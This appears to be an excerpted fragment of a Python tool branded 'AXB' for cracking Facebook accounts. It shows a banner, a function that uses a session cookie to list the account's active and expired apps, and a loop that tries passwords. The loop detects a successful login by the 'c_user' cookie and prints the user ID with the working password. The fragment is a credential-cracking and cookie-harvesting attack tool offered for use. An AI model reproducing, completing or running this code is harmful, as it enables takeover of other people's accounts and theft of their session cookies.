...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[AXB] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[AXB] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
...
logo =                                          ("""   
      ...
      .o.       ooooooo  ooooo oooooooooo.                  
     .888.       `8888    d8'  `888'   `Y8b                 
    .8"888.        Y888..8P     888     888  .oooooooo      
   .8' `888.        `8888'      888oooo888' 888' `88b       
  .88ooo8888.      .8PY888.     888    `88b 888   888       
 .8'     `888.    d8'  `888b    888    .88P `88bod8P'       
o88o     o8888o o888o  o88888o o888bood8P'  `8oooooo.       
                                            d"     YD       
                                            "Y88888P'       
...
AXB-TOOR\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mAzan X.\33[0;m\033[1;32m && \033[1;33mAXB\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AXB-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
